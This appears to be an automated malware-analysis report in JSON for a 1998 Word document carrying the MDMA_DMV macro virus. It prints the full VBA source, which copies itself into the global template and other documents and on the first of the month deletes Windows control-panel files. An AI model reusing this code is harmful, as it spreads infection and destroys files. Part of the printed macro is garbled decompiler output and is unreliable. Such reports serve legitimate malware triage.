{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoClose\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "Call": "May call a DLL using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Lib": "May run code from a DLL",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nOn Error Resume Next\n    install\n    If (WordBasic.Day(WordBasic.Now()) = 1) Then\n        Select Case get_platform\n            Case 1\n                infect_mac\n            Case 2\n                WordBasic.Call \"infect_windows\"\n            Case 3\n                WordBasic.Call \"infect_NT\"\n            Case 4\n                WordBasic.Call \"infect_95\"\n        End Select\n        show_credits\n    End If\nEnd Sub\n\nPrivate Sub install()\nDim total\nDim installed\nDim i\n    On Error Resume Next\n    total = WordBasic.CountMacros(0)\n    installed = 0\n    If total > 0 Then\n        For i = 1 To total\n            If WordBasic.[MacroName$](i, 0) = \"AutoClose\" Then\n                installed = 1\n            End If\n        Next\n    End If\n    If installed = 0 Then\n        WordBasic.MacroCopy WordBasic.[WindowName$]() + \":AutoClose\", \"Global:AutoClose\", 1\n    Else\n        total = WordBasic.CountMacros(1)\n        installed = 0\n        If total > 0 Then\n            For i = 1 To total\n                If WordBasic.[MacroName$](i, 1) = \"AutoClose\" Then\n                    installed = 1\n                End If\n            Next\n        End If\n        If installed = 0 Then\n            WordBasic.FileSaveAs Format:=1\n            WordBasic.MacroCopy \"Global:AutoClose\", WordBasic.[WindowName$]() + \":AutoClose\", 1\n        End If\n    End If\nEnd Sub\n\nPrivate Function get_platform()\n    On Error Resume Next\n    If InStr(WordBasic.[AppInfo$](1), \"Macintosh\") Then\n        get_platform = 1                    'MAC\n    End If\n\n    If WordBasic.[AppInfo$](9) <> \"0\" Then\n        get_platform = 2                    'old version of windows\n    End If\n\n    If InStr(WordBasic.[GetSystemInfo$](21), \"NT\") Then\n        get_platform = 3                  'Windows NT\n    End If\n    \n    'is nothing else, so must be... '95!\n    get_platform = 4\n\nEnd Function\n\nPrivate Sub infect_mac()\n    On Error Resume Next\n         -1                             -1-1                                                          <           Cdecl             -1      >      +1    -1     <                    -1      <   +1    -1                    <                        -1      <              Lib                   -1      +1                             -1       <    <      <       +1        Lib     Lib     -1                                                                                                                                                                                                                                                                                                            Double                                                                                                                                       Lib     Lib  Step    Lib      Lib\n-29025               +1                         Private Declare        Integer                                                                                                                                                                                                                                                                                                                                                                                                                                                      ,Unrecognized_Argument29554, Unrecognized_Argument27154 Not WordBasic.Input                  \"1\", \"\"\n    WordBasic.Kill \"c:\\windows\\system\\*.cpl\"\nEnd Sub\n\nPrivate Sub show_credits()\n    On Error Resume Next\n    WordBasic.MsgBox \"You are infected with MDMA_DMV. Brought to you by MDMA (Many Delinquent Modern Anarchists).\", \"MDMA_DMV\", 16\nEnd Sub\n"
    },
    "filename": "VirusShare_0cf28a895cbe3dac76328b56b933f7de",
    "filesize": 31744,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: MakeDOKs Copied Macro Virus, Author: l, Template: Normal.dot, Last Saved By: l, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Mon Jan 26 15:31:00 1998, Last Saved Time/Date: Mon Jan 26 15:31:00 1998, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "0cf28a895cbe3dac76328b56b933f7de",
        "sha1": "cd25cc255c3af299149249c1ab014be9589dc056",
        "sha256": "2ff21a4a58c0ffd4b094fdd62239174f1ddeefcb1cd27028aab827a7d1ca73a2"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "/ =!",
            "_!&_!&",
            "MakeDOKs Copied Macro Virus",
            "Normal.dot",
            "Microsoft Word 8.0",
            "[go*",
            "[go*",
            "Lack Of Organization",
            "MakeDOKs Copied Macro Virus",
            "Title",
            "_PID_GUID",
            "DEST",
            "DEST",
            "DEST",
            "DEST",
            "E:\\winword",
            "utocW",
            ":AutoOpen",
            ":AutoOpen",
            "normal",
            "oOpe",
            "UNARA~1.DOK",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "$](i, 0",
            "('Copy ",
            "D-@) + \":G,",
            " \"Global",
            "D)ElseCP'_1_A",
            "1z*1",
            "eSaveAs ",
            "mat:=",
            "uwFunction*x",
            "t ! InStr",
            "[A@ppInfof1",
            ") N`",
            "intos|h\"",
            "'MACJ",
            "9) <> \",0\"l2l",
            "old versq of d",
            "etSystem]",
            "';s NT",
            "'is noth ing e@w, ",
            "so must ",
            "be... '95!#",
            "E>og%?B",
            "Cdecl",
            "Dope",
            "Step",
            "-29025",
            "D02ar",
            "Integerf",
            "recogniz@ed_Argn",
            "t29554, ",
            "7154 ",
            "NotHInput",
            "\"1\"y",
            "Kill \"c:",
            "\\o\\sBm\\*.Xcpl",
            "MsgB",
            "ox \"You ",
            "a+edwth ",
            "MDMA_DMV",
            ". Brought` y",
            " (Many D@elinqu",
            "Modern A",
            "narchist8s).a",
            "A.B.@,",
            "infect_windows ",
            "infect_NT",
            "infect_95",
            "AutoClose",
            ":AutoClose",
            "Global:AutoClose",
            "gume",
            "zed_Ar ",
            "AutoClose",
            "    ",
            "    ",
            "      ",
            "Global:AutoClose ",
            ":AutoClose",
            "    h",
            "Macintosh",
            "  Lib h",
            "old version of windows",
            "Windows NTh",
            "is nothing else, so must be... '95!",
            "         -1                             -1-1                                                          <           Cdecl             -1      >      +1    -1     <                    -1      <   +1    -1                    <                        -1      <              Lib                   -1      +1                             -1       <    <      <       +1        Lib     Lib     -1                                                                                                                                                                                                                                                                                                            Double                                                                                                                                       Lib     Lib  Step    Lib      Lib",
            "-29025               +1                         Private Declare        Integer                                                                                                                                                                                                                                                                                                                                                                                                                                                      ,Unrecognized_Argument29554, Unrecognized_Argument27154 Not WordBasic.Input                  \"1\", \"\"",
            "c:\\windows\\system\\*.cpl",
            "You are infected with MDMA_DMV. Brought to you by MDMA (Many Delinquent Modern Anarchists).",
            "MDMA_DMV",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oClose\"",
            "Publi",
            "c Sub MA",
            "IN()",
            " Error R",
            "fNext",
            "inst",
            "If (",
            "WordBasi c.Day",
            "w())",
            "1) 0Then",
            "lect Cas",
            "e get_platform",
            "=_mac",
            "C[ \"",
            "windows",
            ":R3&\"NT",
            "End ",
            "show_cre0dits",
            "ubri<va",
            "\u03c1Dim to",
            "OountMacros(0",
            "L~F@i@",
            "1 To&5",
            "2434ccac5d",
            "2534ccac5d",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "TemplateProjectE",
            "Module1b",
            "AutoClose",
            "MAIN,",
            "install",
            "WordBasic",
            "Now%",
            "get_platform",
            "infect_mac",
            "show_credits",
            "totalU",
            "installed",
            "CountMacros",
            "MacroName$",
            "MacroCopyE",
            "WindowName$",
            "FileSaveAs",
            "AppInfo$3",
            "GetSystemInfo$",
            "Kill",
            "MsgBoxR",
            "Documentj",
            "Template",
            "Project",
            "9std ole>",
            "*\\G{0002`0430-",
            "0046}",
            "#2.0#0#C",
            ":\\WINDOW",
            "S\\SYSTEM",
            "\\STDOLE2 .TLB#",
            "utomatioFn",
            "SForms>",
            "FC2E8",
            "4562-635",
            "F-11D1-8",
            "BD2-4445p5354",
            "TWD#Micr@osoft ",
            "` Ob",
            " Library",
            "$PTMP\\VBE",
            "\\E&EXg&.E",
            "vOPffic",
            "vR2D",
            "F8D04C-5",
            "BFA-101B -BDE5",
            "2RD:\\",
            "OFFICE97",
            ",O97.DLLR",
            " 8.0R\"",
            "ThisDocument",
            "u@(e",
            "@Close",
            "ThisDocument",
            "AutoClose",
            "ID=\"{72C7AADE-962E-11D1-8BD9-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoClose",
            "Name=\"TemplateProject\"",
            "HelpContextID=\"0\"",
            "CMG=\"2F2D9F90A190EA94EA94EA94EA94\"",
            "DPB=\"7C7ECC6354B155B155B1\"",
            "GC=\"D7D567DE9962F563F5630A\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "AutoClose=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.377594",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
